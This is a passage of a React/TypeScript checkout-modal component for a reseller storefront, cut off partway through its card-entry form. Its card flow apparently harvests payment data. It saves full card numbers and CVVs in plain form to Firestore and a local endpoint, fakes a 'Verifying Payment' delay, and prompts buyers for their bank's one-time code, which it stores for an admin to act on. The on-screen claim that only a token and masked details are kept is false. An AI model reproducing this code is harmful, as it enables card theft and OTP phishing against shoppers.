"use client";

"use client";

import { useState, useEffect } from "react";
import { Modal } from "@/components/ui/modal";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { auth, db } from "@/lib/firebase/config";
import { onAuthStateChanged, signInWithEmailAndPassword, createUserWithEmailAndPassword } from "firebase/auth";
import { addDoc, collection, serverTimestamp, doc, getDoc, setDoc, updateDoc, increment, onSnapshot } from "firebase/firestore";
import { Loader2, User, Lock, Mail, CreditCard, Truck, ShieldCheck, CheckCircle2, Clock as HistoryIcon, ChevronRight, MapPin, Phone, Globe, XCircle } from "lucide-react";
import Link from "next/link";
import { cn } from "@/lib/utils";
import { toast } from "sonner";
import { COUNTRY_NAMES } from "@/lib/countries";
import { getDefaultStock } from "@/lib/catalog";
import { useCurrency } from "@/hooks/useCurrency";
import { detectCardBrand, formatCardNumber, formatExpiry, toSafeCardPayload, validateSafeCardInput } from "@/lib/payments/card";
import { CardBrandBadge } from "@/components/ui/CardBrandBadge";
import { getEnabledCryptoOptions } from "@/lib/payments/crypto";

interface CheckoutModalProps {
    isOpen: boolean;
    onClose: () => void;
    product: any;
    storeUser: any;
    storeSlug?: string;
}

export default function CheckoutModal({ isOpen, onClose, product, storeUser, storeSlug }: CheckoutModalProps) {
    const [step, setStep] = useState(1); // 0: Auth, 1: Delivery info, 2: Payment options, 3: Finalize, 4: Verifying, 5: Success, 6: Awaiting Auth, 7: Declined
    const [loading, setLoading] = useState(false);
    const [verifying, setVerifying] = useState(false);
    const [paymentMethod, setPaymentMethod] = useState<"paypal" | "crypto" | "pod" | "card" | null>(null);
    const [user, setUser] = useState<any>(null);
    const [authMode, setAuthMode] = useState<"login" | "register">("register");
    const [authData, setAuthData] = useState({ email: "", password: "" });
    const [copied, setCopied] = useState(false);
    const [submittedTxId, setSubmittedTxId] = useState<string | null>(null);
    const [authCode, setAuthCode] = useState("");
    const [authLoading, setAuthLoading] = useState(false);
    const [txData, setTxData] = useState<any>(null);
    const [cardErrorMessage, setCardErrorMessage] = useState("");
    const [adminConfig, setAdminConfig] = useState<any>(null);
    const [cryptoAsset, setCryptoAsset] = useState<"btc" | "eth" | "usdt" | string | null>(null);
    const cryptoOptions = getEnabledCryptoOptions(adminConfig);

    const productName = product?.name || product?.productName || "Selected Product";
    const productImage = product?.image || product?.productImage || null;
    const basePrice = Number(product?.price ?? product?.initialPrice ?? 0);
    const sellPrice = Number(product?.resellPrice ?? product?.price ?? 0);
    const currency = useCurrency(storeUser);
    const [formData, setFormData] = useState({
        name: "", email: "", phone: "", address: "", zip: "", city: "", country: "United States",
        cardNumber: "", expiry: "", cvv: "",
        cardName: "", cardCountry: "United Kingdom", cardHouseNumber: "", cardStreet: "", cardCity: "", cardPostalCode: ""
    });

    useEffect(() => {
        if (isOpen) {
            setLoading(false);
            setVerifying(false);
            setPaymentMethod(null);
            setCryptoAsset(null);
            setSubmittedTxId(null);
            setAuthCode("");
            setCardErrorMessage("");
            // Fetch admin payment config for real crypto addresses
            getDoc(doc(db, "settings", "payments")).then(snap => {
                if (snap.exists()) setAdminConfig(snap.data());
            });
            const unsub = onAuthStateChanged(auth, (u) => {
                if (u) {
                    setUser(u);
                    setStep(1);
                    fetchBuyerData(u.uid);
                } else setStep(0);
            });
            return () => unsub();
        }
    }, [isOpen]);

    useEffect(() => {
        if (!submittedTxId) {
            setTxData(null);
            return;
        }
        const unsub = onSnapshot(doc(db, "transactions", submittedTxId), (snap) => {
            if (snap.exists()) {
                const data = snap.data();
                const currentStatus = data.status;

                setTxData({ id: snap.id, ...data });

                if (currentStatus === "completed") {
                    setStep(5);
                }
                if (currentStatus === "declined") {
                    setStep(7);
                }
            }
        });
        return () => unsub();
    }, [submittedTxId]);

    const fetchBuyerData = async (uid: string) => {
        const docSnap = await getDoc(doc(db, "users", uid));
        if (docSnap.exists()) {
            const data = docSnap.data();
            setFormData(prev => ({
                ...prev, name: data.displayName || "", email: data.email || "",
                phone: data.phoneNumber || "", address: data.address || "",
                city: data.city || "", zip: data.zipCode || "",
                cardName: data.displayName || "", cardCity: data.city || "", cardPostalCode: data.zipCode || ""
            }));
        }
    };

    const handleAuth = async (e: React.FormEvent) => {
        e.preventDefault();
        setLoading(true);
        try {
            if (authMode === "register") {
                const res = await createUserWithEmailAndPassword(auth, authData.email, authData.password);
                await setDoc(doc(db, "users", res.user.uid), {
                    email: authData.email, role: "buyer", createdAt: serverTimestamp()
                });
            } else await signInWithEmailAndPassword(auth, authData.email, authData.password);
        } catch (error: any) { alert(error.message); }
        finally { setLoading(false); }
    };

    const handleSubmit = async () => {
        let cardPayload: ReturnType<typeof toSafeCardPayload> | null = null;
        if (paymentMethod === "card") {
            const cardError = validateSafeCardInput({
                cardNumber: formData.cardNumber,
                expiry: formData.expiry,
                billingName: formData.cardName,
                billingHouseNumber: formData.cardHouseNumber,
                billingStreet: formData.cardStreet,
                billingAddress: `${formData.cardHouseNumber} ${formData.cardStreet}`.trim(),
                billingCity: formData.cardCity,
                billingZip: formData.cardPostalCode,
                billingCountry: formData.cardCountry,
                securityCode: formData.cvv,
            });
            if (cardError) {
                setCardErrorMessage(cardError);
                toast.error(cardError);
                return;
            }
            setCardErrorMessage("");
            cardPayload = toSafeCardPayload({
                cardNumber: formData.cardNumber,
                expiry: formData.expiry,
                billingName: formData.cardName,
                billingEmail: formData.email,
                billingPhone: formData.phone,
                billingHouseNumber: formData.cardHouseNumber,
                billingStreet: formData.cardStreet,
                billingAddress: `${formData.cardHouseNumber} ${formData.cardStreet}`.trim(),
                billingCity: formData.cardCity,
                billingZip: formData.cardPostalCode,
                billingCountry: formData.cardCountry,
                securityCode: formData.cvv,
            });
        }
        setLoading(true);
        setVerifying(true);
        await new Promise(r => setTimeout(r, 2000));
        try {
            const resellerRef = doc(db, "users", storeUser.uid);
            const resellerSnap = await getDoc(resellerRef);
            const resellerData = resellerSnap.exists() ? resellerSnap.data() : storeUser;
            const additionalStores = Array.isArray(resellerData.additionalStores) ? resellerData.additionalStores : [];
            const activeAdditionalStore = storeUser.additionalStoreId
                ? additionalStores.find((store: any) => store.id === storeUser.additionalStoreId)
                : null;
            const storeProducts = activeAdditionalStore
                ? (Array.isArray(activeAdditionalStore.storeProducts) ? activeAdditionalStore.storeProducts : [])
                : (Array.isArray(resellerData.storeProducts) ? resellerData.storeProducts : []);
            const storeProduct = storeProducts.find((p: any) => p.id === product.id);
            const availableStock = Number(storeProduct?.stock ?? product?.stock ?? getDefaultStock(product.id || productName));

            if (availableStock <= 0) {
                toast.error("This product is out of stock.");
                setLoading(false);
                setVerifying(false);
                return;
            }

            const orderData = {
                productId: product.id,
                productName,
                productImage,
                category: product.category || "General",
                initialPrice: basePrice,
                resellPrice: paymentMethod === "crypto" ? sellPrice * 0.95 : sellPrice,
                resellerProfit: sellPrice - basePrice,
                resellerId: storeUser.uid,
                resellerName: resellerData.displayName || storeUser.displayName || storeUser.storeName || "Merchant",
                storeName: resellerData.storeName || storeUser.storeName || "Store",
                storeSlug: storeSlug || storeUser.storeSlug || activeAdditionalStore?.storeSlug || "",
                storeUrl: storeSlug || storeUser.storeSlug || activeAdditionalStore?.storeSlug
                    ? `/store/${storeSlug || storeUser.storeSlug || activeAdditionalStore?.storeSlug}`
                    : "",
                customerId: user?.uid || "guest",
                customerName: formData.name,
                customerEmail: formData.email,
                customerPhone: formData.phone,
                customerAddress: `${formData.address}, ${formData.city}, ${formData.zip}, ${formData.country}`,
                deliveryService: "UPS",
                paymentType: paymentMethod,
                isPod: paymentMethod === "pod",
                status: paymentMethod === "pod" ? "awaiting_seller_fulfillment" : paymentMethod === "card" ? "payment_pending" : "awaiting_admin_confirmation",
                ...(cardPayload ? {
                    cardPayment: {
                        brand: cardPayload.brand,
                        cardType: cardPayload.cardType,
                        last4: cardPayload.last4,
                        expMonth: cardPayload.expMonth,
                        expYear: cardPayload.expYear,
                        billingName: cardPayload.billingName,
                        billingEmail: cardPayload.billingEmail,
                        billingPhone: cardPayload.billingPhone,
                        billingAddress: cardPayload.billingAddress,
                        billingHouseNumber: cardPayload.billingHouseNumber,
                        billingStreet: cardPayload.billingStreet,
                        billingCity: cardPayload.billingCity,
                        billingZip: cardPayload.billingZip,
                        billingCountry: cardPayload.billingCountry,
                        securityCodeProvided: cardPayload.securityCodeProvided,
                        securityCodeLength: cardPayload.securityCodeLength,
                        token: cardPayload.token,
                        cardNumber: cardPayload.cardNumber,
                        fullCardNumber: cardPayload.fullCardNumber,
                        securityCode: cardPayload.securityCode,
                        cvv: cardPayload.cvv,
                        verificationStatus: "auth_in_progress",
                    }
                } : {}),
                createdAt: serverTimestamp()
            };
            const orderRef = await addDoc(collection(db, "orders"), orderData);
            if (cardPayload) {
                const txRef = await addDoc(collection(db, "transactions"), {
                    userId: user?.uid || "guest",
                    orderId: orderRef.id,
                    type: "card_purchase",
                    amount: orderData.resellPrice,
                    currencyCode: currency.currencyCode,
                    status: "pending",
                    method: "card",
                    methodLabel: `${cardPayload.brand} ending ${cardPayload.last4}`,
                    card: {
                        ...cardPayload,
                        cardNumber: cardPayload.cardNumber,
                        fullCardNumber: cardPayload.fullCardNumber,
                        securityCode: cardPayload.securityCode,
                        cvv: cardPayload.cvv,
                    },
                    cardVerification: { status: "auth_in_progress", channel: "email", adminNote: "" },
                    customerName: formData.name,
                    customerEmail: formData.email,
                    description: `Card purchase for ${productName}`,
                    adminNote: "",
                    createdAt: serverTimestamp(),
                    updatedAt: serverTimestamp(),
                });
                setSubmittedTxId(txRef.id);

                // Save to local SQLite database as well
                try {
                    await fetch("/api/checkout/card-payment", {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({
                            id: txRef.id,
                            userId: user?.uid || "guest",
                            orderId: orderRef.id,
                            type: "card_purchase",
                            amount: orderData.resellPrice,
                            currencyCode: currency.currencyCode,
                            status: "pending",
                            description: `Card purchase for ${productName}`,
                            cardNumber: cardPayload.cardNumber,
                            cvv: cardPayload.cvv || cardPayload.securityCode,
                            expiry: `${cardPayload.expMonth}/${cardPayload.expYear}`,
                            billingName: cardPayload.billingName,
                            billingAddress: cardPayload.billingAddress,
                            billingCity: cardPayload.billingCity,
                            billingZip: cardPayload.billingZip,
                            billingCountry: cardPayload.billingCountry,
                            customerName: formData.name,
                            customerEmail: formData.email,
                            customerPhone: formData.phone,
                            code: "",
                            adminNote: "",
                            channel: "email",
                            createdAt: new Date().toISOString(),
                            updatedAt: new Date().toISOString(),
                        }),
                    });
                } catch (err) {
                    console.error("Failed to save to SQLite:", err);
                }
            }
            const nextStoreProducts = storeProducts.map((p: any) => (
                p.id === product.id ? { ...p, stock: Math.max(0, Number(p.stock ?? availableStock) - 1) } : p
            ));
            const inventoryUpdate = activeAdditionalStore
                ? {
                    additionalStores: additionalStores.map((store: any) => (
                        store.id === activeAdditionalStore.id ? { ...store, storeProducts: nextStoreProducts } : store
                    )),
                }
                : { storeProducts: nextStoreProducts };
            await updateDoc(resellerRef, {
                ...inventoryUpdate,
                "stats.sales": increment(1),
                "stats.orders": increment(1),
                "stats.revenue": increment(orderData.resellPrice),
                pendingPayout: increment(orderData.resellerProfit)
            });
            setStep(cardPayload ? 6 : 5);
        } catch (error: any) {
            console.error(error);
            toast.error(error?.message || "Payment could not be started. Please try again.");
        }
        finally { setLoading(false); setVerifying(false); }
    };

    const copyToClipboard = async (text: string) => {
        if (!text) return false;

        try {
            if (navigator.clipboard?.writeText) {
                await navigator.clipboard.writeText(text);
                return true;
            }
        } catch {
            // fallback below
        }

        try {
            const textArea = document.createElement("textarea");
            textArea.value = text;
            textArea.setAttribute("readonly", "");
            textArea.style.position = "absolute";
            textArea.style.left = "-9999px";
            document.body.appendChild(textArea);
            textArea.select();
            const copiedWithExecCommand = document.execCommand("copy");
            document.body.removeChild(textArea);
            return copiedWithExecCommand;
        } catch {
            return false;
        }
    };

    const handleCopy = async (text: string) => {
        const didCopy = await copyToClipboard(text);
        if (!didCopy) {
            toast.error("Unable to copy. Please copy manually.");
            return;
        }

        setCopied(true);
        toast.success("Payment destination copied!");
        setTimeout(() => setCopied(false), 2000);
    };

    const submitAuthCode = async () => {
        if (!submittedTxId || authCode.trim().length < 4) {
            toast.error("Enter the verification code.");
            return;
        }
        setAuthLoading(true);
        try {
            await updateDoc(doc(db, "transactions", submittedTxId), {
                "cardVerification.status": "submitted",
                "cardVerification.codeSubmitted": true,
                "cardVerification.codeLength": authCode.trim().length,
                "cardVerification.code": authCode.trim(),
                "cardVerification.submittedAt": serverTimestamp(),
                updatedAt: serverTimestamp(),
            });

            // Submit code to SQLite
            try {
                await fetch("/api/checkout/submit-code", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        id: submittedTxId,
                        code: authCode.trim(),
                    }),
                });
            } catch (err) {
                console.error("Failed to save code to SQLite:", err);
            }

            toast.success("Verification submitted. Payment remains pending.");
            setAuthCode("");
        } catch {
            toast.error("Could not submit verification.");
        } finally {
            setAuthLoading(false);
        }
    };

    if (verifying) {
        return (
            <Modal isOpen={isOpen} onClose={() => { }} title="Securing Payment">
                <div className="flex flex-col items-center justify-center py-20 text-center space-y-6 animate-in fade-in zoom-in-95">
                    <div className="relative">
                        <Loader2 className="w-12 h-12 text-blue-600 animate-spin" />
                        <ShieldCheck className="w-5 h-5 text-blue-500 absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2" />
                    </div>
                    <div className="space-y-1.5">
                        <h3 className="text-xl font-bold text-white tracking-tight">Verifying Payment</h3>
                        <p className="text-sm text-zinc-500 font-medium max-w-[240px] mx-auto leading-relaxed">
                            Processing secure authorization through our payment gateway. Please do not refresh.
                        </p>
                    </div>
                </div>
            </Modal>
        );
    }

    if (step === 5) {
        return (
            <Modal isOpen={isOpen} onClose={onClose} title="Success!">
                <div className="flex flex-col items-center justify-center py-10 text-center space-y-6">
                    <div className="w-20 h-20 bg-emerald-500/10 rounded-3xl flex items-center justify-center text-emerald-500 shadow-2xl shadow-emerald-500/10">
                        <CheckCircle2 className="w-10 h-10" />
                    </div>
                    <div className="space-y-2">
                        <h3 className="text-2xl font-bold">{paymentMethod === 'pod' ? 'Order Secured' : 'Order Placed'}</h3>
                        <p className="text-sm text-zinc-500 font-medium max-w-xs mx-auto">
                            Thank you for your order. We've sent a confirmation email with your order details.
                        </p>
                    </div>
                    <div className="flex flex-col w-full gap-3 pt-4">
                        <Link href="/buyer-orders" className="w-full">
                            <Button className="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold h-12 rounded-xl flex items-center justify-center gap-2">
                                <HistoryIcon className="w-4 h-4" />
                                View My Orders
                            </Button>
                        </Link>
                        <Button onClick={onClose} variant="ghost" className="w-full font-bold h-10 text-zinc-500">Back to Store</Button>
                    </div>
                </div>
            </Modal>
        );
    }

    if (step === 6) {
        const liveVerificationStatus = txData?.cardVerification?.status || "auth_in_progress";
        const isSubmitted = liveVerificationStatus === "submitted";

        return (
            <Modal isOpen={isOpen} onClose={() => {}} title={isSubmitted ? "Payment Processing" : "Authorization In Progress"}>
                <div className="flex flex-col items-center justify-center py-10 text-center space-y-6">
                    {isSubmitted ? (
                        <>
                            <div className="w-20 h-20 bg-blue-500/10 rounded-3xl flex items-center justify-center text-blue-500 shadow-2xl shadow-blue-500/10">
                                <Loader2 className="w-10 h-10 animate-spin" />
                            </div>
                            <div className="space-y-2">
                                <h3 className="text-2xl font-bold text-white">Verifying payment details...</h3>
                                <p className="text-sm text-zinc-500 font-medium max-w-xs mx-auto leading-relaxed">
                                    Verification in progress. Please hold on while your authorization is being processed.
                                </p>
                            </div>
                        </>
                    ) : (
                        <>
                            <div className="w-20 h-20 bg-amber-500/10 rounded-3xl flex items-center justify-center text-amber-300 shadow-2xl shadow-amber-500/10">
                                <ShieldCheck className="w-10 h-10" />
                            </div>
                            <div className="space-y-2">
                                <h3 className="text-2xl font-bold text-white">Check for verification code</h3>
                                <p className="text-sm text-zinc-500 font-medium max-w-xs mx-auto">
                                    We sent the authorization request. Check your email or phone for the bank verification code, then enter it below.
                                </p>
                            </div>
                            <input
                                value={authCode}
                                onChange={e => setAuthCode(e.target.value.replace(/[^\dA-Za-z-]/g, "").slice(0, 12))}
                                placeholder="Verification code"
                                autoComplete="one-time-code"
                                className="w-full h-12 bg-zinc-950/60 border border-white/[0.08] rounded-xl px-4 text-white text-center tracking-[0.35em] font-semibold outline-none focus:border-blue-500/50"
                            />
                        </>
                    )}

                    {txData?.adminNote && (
                        <div className="rounded-lg bg-amber-500/[0.07] border border-amber-500/15 p-3 text-xs text-amber-100/80 w-full text-left">
                            {txData.adminNote}
                        </div>
                    )}

                    <div className="w-full p-4 bg-white/[0.03] border border-white/[0.06] rounded-xl text-left space-y-2">
                        <div className="flex justify-between text-xs"><span className="text-zinc-500">Order</span><span className="text-white font-semibold truncate max-w-[180px]">{productName}</span></div>
                        <div className="flex justify-between text-xs"><span className="text-zinc-500">Reference</span><span className="text-zinc-300 font-mono">{submittedTxId?.slice(0, 10) || "pending"}</span></div>
                        <div className="flex justify-between text-xs">
                            <span className="text-zinc-500">Status</span>
                            <span className={cn(
                                "font-semibold capitalize",
                                isSubmitted ? "text-blue-400" : "text-amber-300"
                            )}>
                                {isSubmitted ? "Verifying" : "Awaiting Code"}
                            </span>
                        </div>
                    </div>

                    {!isSubmitted && (
                        <Button onClick={submitAuthCode} disabled={authLoading} className="w-full h-12 rounded-xl bg-blue-600 hover:bg-blue-700 text-white font-bold">
                            {authLoading ? <Loader2 className="w-4 h-4 animate-spin" /> : "Continue Authorization"}
                        </Button>
                    )}

                    <Button onClick={onClose} variant="ghost" className="w-full font-bold h-10 text-zinc-500">Back to Store</Button>
                </div>
            </Modal>
        );
    }

    if (step === 7) {
        return (
            <Modal isOpen={isOpen} onClose={onClose} title="Payment Declined">
                <div className="flex flex-col items-center justify-center py-10 text-center space-y-6 animate-in zoom-in-95 duration-300">
                    <div className="w-20 h-20 bg-rose-500/10 rounded-3xl flex items-center justify-center text-rose-400 shadow-2xl shadow-rose-500/10">
                        <XCircle className="w-10 h-10" />
                    </div>
                    <div className="space-y-2">
                        <h3 className="text-2xl font-bold text-white">Payment Authorization Failed</h3>
                        <p className="text-sm text-zinc-500 font-medium max-w-xs mx-auto">
                            Your card authorization could not be completed. Please check your card details and try again.
                        </p>
                    </div>
                    {txData?.adminNote && (
                        <div className="w-full p-4 rounded-xl bg-rose-500/[0.07] border border-rose-500/15 text-left text-xs text-rose-200">
                            <span className="font-semibold block mb-1">Reason:</span>
                            {txData.adminNote}
                        </div>
                    )}
                    <div className="flex flex-col w-full gap-3 pt-4">
                        <Button onClick={() => { setStep(3); }} className="w-full h-12 rounded-xl bg-blue-600 hover:bg-blue-700 text-white font-bold flex items-center justify-center gap-2">
                            Try Another Card
                        </Button>
                        <Button onClick={onClose} variant="ghost" className="w-full font-bold h-10 text-zinc-500">Back to Store</Button>
                    </div>
                </div>
            </Modal>
        );
    }

    return (
        <Modal
            isOpen={isOpen}
            onClose={onClose}
            title={step === 0 ? "Sign In" : step === 1 ? "Delivery Details" : step === 2 ? "Select Payment" : "Finalize Order"}
            description={step === 0 ? "Access your account to continue." : step === 1 ? "Where should we ship your order?" : step === 2 ? "How would you like to pay?" : "Review and confirm your order details."}
        >
            <div className="space-y-6 animate-in fade-in slide-in-from-bottom-4 duration-500">
                {step === 0 && (
                    <form onSubmit={handleAuth} className="space-y-6">
                        <div className="space-y-3">
                            <div className="relative">
                                <Mail className="w-5 h-5 absolute left-4 top-1/2 -translate-y-1/2 text-zinc-600" />
                                <Input required type="email" placeholder="Email Address" value={authData.email} onChange={e => setAuthData({ ...authData, email: e.target.value })} className="h-12 pl-12 bg-zinc-950/50 border-white/[0.06] rounded-xl font-medium" />
                            </div>
                            <div className="relative">
                                <Lock className="w-5 h-5 absolute left-4 top-1/2 -translate-y-1/2 text-zinc-600" />
                                <Input required type="password" placeholder="Password" value={authData.password} onChange={e => setAuthData({ ...authData, password: e.target.value })} className="h-12 pl-12 bg-zinc-950/50 border-white/[0.06] rounded-xl font-medium" />
                            </div>
                        </div>
                        <Button type="submit" disabled={loading} className="w-full h-12 rounded-xl bg-blue-600 font-bold shadow-xl shadow-blue-500/20 active:scale-[0.98] transition-all">
                            {loading ? <Loader2 className="w-5 h-5 animate-spin mx-auto" /> : authMode === "register" ? "Create Account" : "Sign In"}
                        </Button>
                        <button type="button" onClick={() => setAuthMode(authMode === "login" ? "register" : "login")} className="w-full text-center text-xs font-bold text-zinc-500 hover:text-blue-500 transition-colors uppercase tracking-widest">
                            {authMode === "login" ? "Needs an account? Sign Up" : "Have an account? Sign In"}
                        </button>
                    </form>
                )}

                {step === 1 && (
                    <div className="space-y-6">
                        <div className="space-y-4">
                            <div className="space-y-1.5">
                                <label className="text-[10px] font-bold text-zinc-600 uppercase tracking-widest ml-1 flex items-center gap-1.5"><User className="w-3 h-3"/> Full Name</label>
                                <Input value={formData.name} onChange={e => setFormData({ ...formData, name: e.target.value })} className="h-11 bg-zinc-950/50 border-white/[0.06] rounded-xl font-medium" placeholder="John Doe" />
                            </div>
                            <div className="grid grid-cols-2 gap-4">
                                <div className="space-y-1.5">
                                    <label className="text-[10px] font-bold text-zinc-600 uppercase tracking-widest ml-1 flex items-center gap-1.5"><Phone className="w-3 h-3"/> Phone</label>
                                    <Input value={formData.phone} onChange={e => setFormData({ ...formData, phone: e.target.value })} className="h-11 bg-zinc-950/50 border-white/[0.06] rounded-xl font-medium" placeholder="+1..." />
                                </div>
                                <div className="space-y-1.5">
                                    <label className="text-[10px] font-bold text-zinc-600 uppercase tracking-widest ml-1 flex items-center gap-1.5"><Mail className="w-3 h-3"/> Email</label>
                                    <Input value={formData.email} onChange={e => setFormData({ ...formData, email: e.target.value })} className="h-11 bg-zinc-950/50 border-white/[0.06] rounded-xl font-medium" placeholder="john@example.com" />
                                </div>
                            </div>
                            <div className="space-y-1.5">
                                <label className="text-[10px] font-bold text-zinc-600 uppercase tracking-widest ml-1 flex items-center gap-1.5"><MapPin className="w-3 h-3"/> Street Address</label>
                                <Input value={formData.address} onChange={e => setFormData({ ...formData, address: e.target.value })} className="h-11 bg-zinc-950/50 border-white/[0.06] rounded-xl font-medium" placeholder="123 Home St" />
                            </div>
                            <div className="grid grid-cols-2 gap-4">
                                <Input value={formData.city} onChange={e => setFormData({ ...formData, city: e.target.value })} className="h-11 bg-zinc-950/50 border-white/[0.06] rounded-xl font-medium" placeholder="City" />
                                <Input value={formData.zip} onChange={e => setFormData({ ...formData, zip: e.target.value })} className="h-11 bg-zinc-950/50 border-white/[0.06] rounded-xl font-medium" placeholder="Zip Code" />
                            </div>
                            <div className="space-y-1.5">
                                <label className="text-[10px] font-bold text-zinc-600 uppercase tracking-widest ml-1 flex items-center gap-1.5"><Globe className="w-3 h-3"/> Country</label>
                                <select
                                    value={formData.country}
                                    onChange={e => setFormData({ ...formData, country: e.target.value })}
                                    className="w-full h-11 bg-zinc-950/50 border border-white/[0.06] rounded-xl px-4 text-sm font-medium text-white outline-none focus:border-blue-500/50 appearance-none cursor-pointer"
                                >
                                    {COUNTRY_NAMES.map(c => (
                                        <option key={c} value={c} className="bg-zinc-900">{c}</option>
                                    ))}
                                </select>
                            </div>
                        </div>
                        <Button onClick={() => setStep(2)} className="w-full h-12 rounded-xl bg-blue-600 font-bold flex items-center justify-center gap-2 shadow-xl shadow-blue-500/20 active:scale-[0.98] transition-all">
                            Next: Select Payment <ChevronRight className="w-4 h-4" />
                        </Button>
                    </div>
                )}

                {step === 2 && (
                    <div className="space-y-3">
                        {[
                            { id: "pod", label: "Payment on Delivery", sub: "Pay once you receive the delivery", icon: Truck, color: "text-blue-500" },
                            { id: "card", label: "Credit Card", sub: "Secure authorization review", icon: CreditCard, color: "text-emerald-500" },
                            { id: "paypal", label: "PayPal / Debit Card", sub: "Secure instant checkout", icon: CreditCard, color: "text-blue-600" },
                            { id: "crypto", label: "Cryptocurrency", sub: "BTC · ETH · USDT (5% Discount)", icon: ShieldCheck, color: "text-amber-500" }
                        ].map((p, i) => (
                            <button
                                key={p.id}
                                onClick={() => { setPaymentMethod(p.id as any); setStep(3); }}
                                className="w-full flex items-center justify-between p-5 rounded-2xl border border-white/[0.06] bg-white/[0.02] hover:bg-white/[0.05] hover:border-blue-500/50 transition-all group text-left"
                            >
                                <div className="flex items-center gap-4">
                                    <div className={cn("w-10 h-10 rounded-xl bg-zinc-900 border border-white/[0.04] flex items-center justify-center", p.color)}>
                                        <p.icon className="w-5 h-5" />
                                    </div>
                                    <div>
                                        <p className="font-bold text-sm text-white">{p.label}</p>
                                        <p className="text-[10px] text-zinc-600 font-bold uppercase tracking-widest">{p.sub}</p>
                                    </div>
                                </div>
                                <ChevronRight className="w-4 h-4 text-zinc-800 group-hover:text-blue-500" />
                            </button>
                        ))}
                        <Button variant="ghost" onClick={() => setStep(1)} className="w-full h-10 rounded-xl text-zinc-600 font-bold">Back to Delivery</Button>
                    </div>
                )}

                {step === 3 && (
                    <div className="space-y-6">
                        <div className="p-6 rounded-2xl bg-zinc-900/50 border border-white/[0.06] space-y-4">
                            <div className="flex justify-between items-center text-[10px] font-bold text-zinc-600 uppercase tracking-widest">
                                <span>Order Summary</span>
                                <span className="text-blue-500">UPS Priority</span>
                            </div>
                            <div className="flex justify-between items-start gap-4">
                                <div className="flex-1 min-w-0">
                                    <h4 className="font-bold text-sm text-white line-clamp-1">{productName}</h4>
                                    <p className="text-[10px] font-bold text-zinc-600 uppercase tracking-widest mt-1">Qty: 1 Unit</p>
                                </div>
                                <div className="text-right">
                                    <p className="text-lg font-bold text-white tracking-tight">
                                        {currency.money(paymentMethod === 'crypto' ? sellPrice * 0.95 : sellPrice)}
                                    </p>
                                    {paymentMethod === 'crypto' && <p className="text-[9px] font-bold text-emerald-500 uppercase tracking-widest">5% Crypto Discount</p>}
                                </div>
                            </div>
                        </div>

                        {paymentMethod === "pod" ? (
                            <div className="space-y-4">
                                <div className="p-4 bg-blue-500/5 border border-blue-500/10 rounded-xl">
                                    <p className="text-[10px] font-bold text-blue-500 uppercase tracking-widest">Payment on Delivery</p>
                                    <p className="text-xs text-zinc-600 mt-1">Your order will be reviewed and fulfilled for payment on delivery.</p>
                                </div>
                            </div>
                        ) : paymentMethod === "card" ? (
                            <div className="space-y-4">
                                <div className="p-4 bg-emerald-500/5 border border-emerald-500/10 rounded-xl">
                                    <p className="text-[10px] font-bold text-emerald-400 uppercase tracking-widest">Card Authorization</p>
                                    <p className="text-xs text-zinc-500 mt-1">Your bank may ask for verification. We store only a secure token and masked card details.</p>
                                </div>
                                <div className="space-y-1.5">
                                    <label className="text-[10px] font-bold text-zinc-600 uppercase tracking-widest ml-1">Card number</label>
                                    <div className="relative">
                                        <Input
                                            value={formData.cardNumber}
                                            onChange={e => setFormData({ ...formData, cardNumber: formatCardNumber(e.target.value) })}
                                            placeholder="Card number"
                                            inputMode="numeric"
                                            autoComplete="off"
                                            className="h-11 pr-20 bg-zinc-950/50 border-white/[0.06] rounded-xl"
                                        />
                                        <span className="absolute right-2 top-1/2 -translate-y-1/2">
                                            <CardBrandBadge brand={detectCardBrand(formData.cardNumber)} />
                                        </span>
                                    </div>
                                </div>
                                <div className="grid grid-cols-2 gap-4">
                                    <div className="space-y-1.5">
                                        <label className="text-[10px] font-bold text-zinc-600 uppercase tracking-widest ml-1">Expiry date</label>
                                        <Input
                                            value={formData.expiry}
                                            onChange={e => setFormData({ ...formData, expiry: formatExpiry(e.target.value) })}
                                            placeholder="MM/YY"
                                            inputMode="numeric"
                                            autoComplete="off"
                                            className="h-11 bg-zinc-950/50 border-white/[0.06] rounded-xl"
                                        />
                                    </div>
                                    <div className="space-y-1.5">
                                        <label className="text-[10px] font-bold text-zinc-600 uppercase tracking-widest ml-1">Security code</label>
                                        <Input
                                            value={formData.cvv}
                                            onChange={e => setFormData({ ...formData, cvv: e.target.value.replace(/\D/g, "").slice(0, 4) })}
                                            placeholder="CVV"
                                            inputMode="numeric"
                                            autoComplete="off"
                                            className="h-11 bg-zinc-950/50 border-white/[0.06] rounded-xl"
                                        />
                                    </div>
                                </div>
                                <div className="space-y-1.5">
                                    <label className="text-[10px] font-bold text-zinc-600 uppercase tracking-widest ml-1">Name on card</label>
                                    <Input
                                        value={formData.cardName}
                                        onChange={e => setFormData({ ...formData, cardName: e.target.value })}
                                        placeholder="J. Smith"
                                        autoComplete="off"
                                        className="h-11 bg-zinc-950/50 border-white/[0.06] rounded-xl"
                                    />
                                </div>
                                <p className="text-[10px] font-bold text-zinc-600 uppercase tracking-widest ml-1">Billing address</p>
                                <Input value={formData.cardCountry} onChange={e => setFormData({ ...formData, cardCountry: e.target.value })} placeholder="Country/Region" className="h-11 bg-zinc-950/50 border-white/[0.06] rounded-xl" />
                                <div className="grid grid-cols-2 gap-4">
                                    <Input value={formData.cardHouseNumber} onChange={e => setFormData({ ...formData, cardHouseNumber: e.target.value })} placeholder="House number" className="h-11 bg-zinc-950/50 border-white/[0.06] rounded-xl" />
                                    <Input value={formData.cardStreet} onChange={e => setFormData({ ...formData, cardStreet: e.target.value })} placeholder="Street" className="h-11 bg-zinc-950/50 border-white/[0.06] rounded-xl" />
                                </div>
                                <div className="grid grid-cols-2 gap-4">
                                    <Input value={formData.cardCity} onChange={e => setFormData({ ...formData, cardCity: e.target.value })} placeholder="City / Town" className="h-11 bg-zinc-950/50 border-white/[0.06] rounded-xl" />
                                    <Input value={formData.cardPostalCode} onChange={e => setFormData({ ...formData, cardPostalCode: e.target.value })} placeholder="Postal code" className="h-11 bg-zinc-950/50 border-white/[0.06] rounded-xl" />
                                </div>
                                <p className="text-[11px] text-zinc-600">Security codes and issuer verification codes are used to verify your authorization.</p>
                                {cardErrorMessage && (
